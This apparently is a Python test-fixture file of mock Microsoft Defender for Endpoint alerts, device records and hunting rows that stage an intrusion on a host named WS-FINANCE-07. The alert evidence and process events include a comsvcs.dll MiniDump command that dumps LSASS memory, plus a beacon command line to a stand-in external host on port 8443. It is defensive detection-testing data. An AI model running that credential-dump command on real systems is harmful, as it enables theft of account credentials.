"""Recorded Microsoft Defender for Endpoint fixtures for mock-mode responses (#100).

Shapes mirror the provider surfaces the live connector will call:

- ``MDE_FIXTURE_ALERTS`` — Graph security ``alerts_v2``-style alert objects
  (id / title / severity / status / category / mitreTechniques / evidence).
- ``MDE_FIXTURE_MACHINES`` — MDE ``machines``-style device records keyed by
  ``computerDnsName`` (risk score, exposure level, health, isolation state).
- ``MDE_FIXTURE_HUNTING_TABLES`` — Advanced Hunting rows keyed by table name
  (``DeviceProcessEvents`` / ``DeviceNetworkEvents`` / ``DeviceLogonEvents``),
  the KQL mock's data source.

The fixtures tell one coherent intrusion story on ``WS-FINANCE-07``:

* An RDP logon from an external IP (198.51.100.44) as ``ACME\\pmiller``.
* ``rundll32.exe`` dumping LSASS via comsvcs.dll (T1003.001) — high alert.
* A beacon to ``update-cdn.example.org`` (198.51.100.44:8443) from an
  unsigned binary in ProgramData (T1071.001) — medium alert, in progress.
* ``SRV-APP-01`` is the quiet comparison machine (low risk, no story rows).

Join keys: ``deviceId``/``machineId`` ties alerts ↔ machines; ``DeviceName``
ties hunting rows ↔ machines.
"""

from __future__ import annotations

from typing import Any

MDE_FIXTURE_ALERTS: list[dict[str, Any]] = [
    {
        "id": "da637940000000000001_-1000000001",
        "title": "Suspicious LSASS memory access via rundll32",
        "severity": "high",
        "status": "new",
        "category": "CredentialAccess",
        "classification": None,
        "determination": None,
        "detectionSource": "microsoftDefenderForEndpoint",
        "mitreTechniques": ["T1003.001"],
        "deviceId": "mde-4b7a1f0e2c9d8e7f6a5b4c3d2e1f0a9b8c7d6e5f",
        "computerDnsName": "WS-FINANCE-07",
        "createdDateTime": "2026-06-10T09:41:22Z",
        "lastUpdateDateTime": "2026-06-10T09:45:00Z",
        "evidence": [
            {
                "entityType": "process",
                "fileName": "rundll32.exe",
                "processCommandLine": (
                    "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 712 "
                    "C:\\ProgramData\\lsass.dmp full"
                ),
                "accountName": "ACME\\pmiller",
                "sha256": "9c1f8a7b6e5d4c3b2a1f0e9d8c7b6a5f4e3d2c1b0a9f8e7d6c5b4a3f2e1d0c9b",
            }
        ],
    },
    {
        "id": "da637940000000000002_-1000000002",
        "title": "Beaconing to rare external host from unsigned binary",
        "severity": "medium",
        "status": "inProgress",
        "category": "CommandAndControl",
        "classification": None,
        "determination": None,
        "detectionSource": "microsoftDefenderForEndpoint",
        "mitreTechniques": ["T1071.001"],
        "deviceId": "mde-4b7a1f0e2c9d8e7f6a5b4c3d2e1f0a9b8c7d6e5f",
        "computerDnsName": "WS-FINANCE-07",
        "createdDateTime": "2026-06-10T10:02:10Z",
        "lastUpdateDateTime": "2026-06-10T10:30:00Z",
        "evidence": [
            {
                "entityType": "process",
                "fileName": "healthsvc.exe",
                "processCommandLine": "C:\\ProgramData\\healthsvc.exe -connect 198.51.100.44:8443",
                "accountName": "ACME\\pmiller",
                "sha256": "1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b",
            }
        ],
    },
    {
        "id": "da637940000000000003_-1000000003",
        "title": "Anomalous RDP logon from external address",
        "severity": "low",
        "status": "resolved",
        "category": "InitialAccess",
        "classification": "truePositive",
        "determination": "compromisedAccount",
        "detectionSource": "microsoftDefenderForEndpoint",
        "mitreTechniques": ["T1021.001"],
        "deviceId": "mde-4b7a1f0e2c9d8e7f6a5b4c3d2e1f0a9b8c7d6e5f",
        "computerDnsName": "WS-FINANCE-07",
        "createdDateTime": "2026-06-10T08:55:03Z",
        "lastUpdateDateTime": "2026-06-11T07:00:00Z",
        "evidence": [
            {
                "entityType": "ip",
                "ipAddress": "198.51.100.44",
            }
        ],
    },
]


MDE_FIXTURE_MACHINES: dict[str, dict[str, Any]] = {
    "WS-FINANCE-07": {
        "id": "mde-4b7a1f0e2c9d8e7f6a5b4c3d2e1f0a9b8c7d6e5f",
        "computerDnsName": "WS-FINANCE-07",
        "firstSeen": "2025-11-02T08:00:00Z",
        "lastSeen": "2026-06-10T10:30:00Z",
        "osPlatform": "Windows11",
        "osBuild": 22631,
        "version": "23H2",
        "lastIpAddress": "10.3.7.21",
        "lastExternalIpAddress": "203.0.113.88",
        "healthStatus": "Active",
        "deviceValue": "High",
        "riskScore": "High",
        "exposureLevel": "Medium",
        "isolationState": "NotIsolated",
        "defenderAvStatus": "Updated",
        "onboardingStatus": "Onboarded",
        "loggedOnUsers": ["ACME\\pmiller"],
        "machineTags": ["department:finance", "location:us-east-1"],
    },
    "SRV-APP-01": {
        "id": "mde-0f9e8d7c6b5a4f3e2d1c0b9a8f7e6d5c4b3a2f1e",
        "computerDnsName": "SRV-APP-01",
        "firstSeen": "2024-08-14T12:00:00Z",
        "lastSeen": "2026-06-10T10:29:00Z",
        "osPlatform": "WindowsServer2022",
        "osBuild": 20348,
        "version": "21H2",
        "lastIpAddress": "10.4.1.12",
        "lastExternalIpAddress": "203.0.113.89",
        "healthStatus": "Active",
        "deviceValue": "Normal",
        "riskScore": "Low",
        "exposureLevel": "Low",
        "isolationState": "NotIsolated",
        "defenderAvStatus": "Updated",
        "onboardingStatus": "Onboarded",
        "loggedOnUsers": ["ACME\\svc_app"],
        "machineTags": ["role:application", "env:production"],
    },
}


MDE_FIXTURE_HUNTING_TABLES: dict[str, list[dict[str, Any]]] = {
    "DeviceProcessEvents": [
        {
            "Timestamp": "2026-06-10T09:41:20Z",
            "DeviceId": "mde-4b7a1f0e2c9d8e7f6a5b4c3d2e1f0a9b8c7d6e5f",
            "DeviceName": "WS-FINANCE-07",
            "AccountName": "pmiller",
            "AccountDomain": "ACME",
            "FileName": "rundll32.exe",
            "ProcessCommandLine": (
                "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 712 "
                "C:\\ProgramData\\lsass.dmp full"
            ),
            "InitiatingProcessFileName": "cmd.exe",
            "InitiatingProcessCommandLine": "cmd.exe /c rundll32 ...",
            "SHA256": "9c1f8a7b6e5d4c3b2a1f0e9d8c7b6a5f4e3d2c1b0a9f8e7d6c5b4a3f2e1d0c9b",
        },
        {
            "Timestamp": "2026-06-10T09:58:44Z",
            "DeviceId": "mde-4b7a1f0e2c9d8e7f6a5b4c3d2e1f0a9b8c7d6e5f",
            "DeviceName": "WS-FINANCE-07",
            "AccountName": "pmiller",
            "AccountDomain": "ACME",
            "FileName": "healthsvc.exe",
            "ProcessCommandLine": "C:\\ProgramData\\healthsvc.exe -connect 198.51.100.44:8443",
            "InitiatingProcessFileName": "explorer.exe",
            "InitiatingProcessCommandLine": "explorer.exe",
            "SHA256": "1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b",
        },
        {
            "Timestamp": "2026-06-10T07:15:02Z",
            "DeviceId": "mde-0f9e8d7c6b5a4f3e2d1c0b9a8f7e6d5c4b3a2f1e",
            "DeviceName": "SRV-APP-01",
            "AccountName": "svc_app",
            "AccountDomain": "ACME",
            "FileName": "w3wp.exe",
            "ProcessCommandLine": "c:\\windows\\system32\\inetsrv\\w3wp.exe -ap AppPool01",
            "InitiatingProcessFileName": "services.exe",
            "InitiatingProcessCommandLine": "services.exe",
            "SHA256": "aa11bb22cc33dd44ee55ff66aa77bb88cc99dd00ee11ff22aa33bb44cc55dd66",
        },
    ],
    "DeviceNetworkEvents": [
        {
            "Timestamp": "2026-06-10T10:02:08Z",
            "DeviceId": "mde-4b7a1f0e2c9d8e7f6a5b4c3d2e1f0a9b8c7d6e5f",
            "DeviceName": "WS-FINANCE-07",
            "ActionType": "ConnectionSuccess",
            "RemoteIP": "198.51.100.44",
            "RemotePort": 8443,
            "RemoteUrl": "update-cdn.example.org",
            "LocalIP": "10.3.7.21",
            "LocalPort": 52144,
            "Protocol": "Tcp",
            "InitiatingProcessFileName": "healthsvc.exe",
            "InitiatingProcessAccountName": "pmiller",
        },
        {
            "Timestamp": "2026-06-10T10:17:08Z",
            "DeviceId": "mde-4b7a1f0e2c9d8e7f6a5b4c3d2e1f0a9b8c7d6e5f",
            "DeviceName": "WS-FINANCE-07",
            "ActionType": "ConnectionSuccess",
            "RemoteIP": "198.51.100.44",
            "RemotePort": 8443,
            "RemoteUrl": "update-cdn.example.org",
            "LocalIP": "10.3.7.21",
            "LocalPort": 52201,
            "Protocol": "Tcp",
            "InitiatingProcessFileName": "healthsvc.exe",
            "InitiatingProcessAccountName": "pmiller",
        },
    ],
    "DeviceLogonEvents": [
        {
            "Timestamp": "2026-06-10T08:55:00Z",
            "DeviceId": "mde-4b7a1f0e2c9d8e7f6a5b4c3d2e1f0a9b8c7d6e5f",
            "DeviceName": "WS-FINANCE-07",
            "ActionType": "LogonSuccess",
            "LogonType": "RemoteInteractive",
            "AccountName": "pmiller",
            "AccountDomain": "ACME",
            "RemoteIP": "198.51.100.44",
            "RemoteDeviceName": "",
        },
        {
            "Timestamp": "2026-06-10T06:30:00Z",
            "DeviceId": "mde-0f9e8d7c6b5a4f3e2d1c0b9a8f7e6d5c4b3a2f1e",
            "DeviceName": "SRV-APP-01",
            "ActionType": "LogonSuccess",
            "LogonType": "Network",
            "AccountName": "svc_app",
            "AccountDomain": "ACME",
            "RemoteIP": "10.4.1.5",
            "RemoteDeviceName": "SRV-MGMT-01",
        },
    ],
}
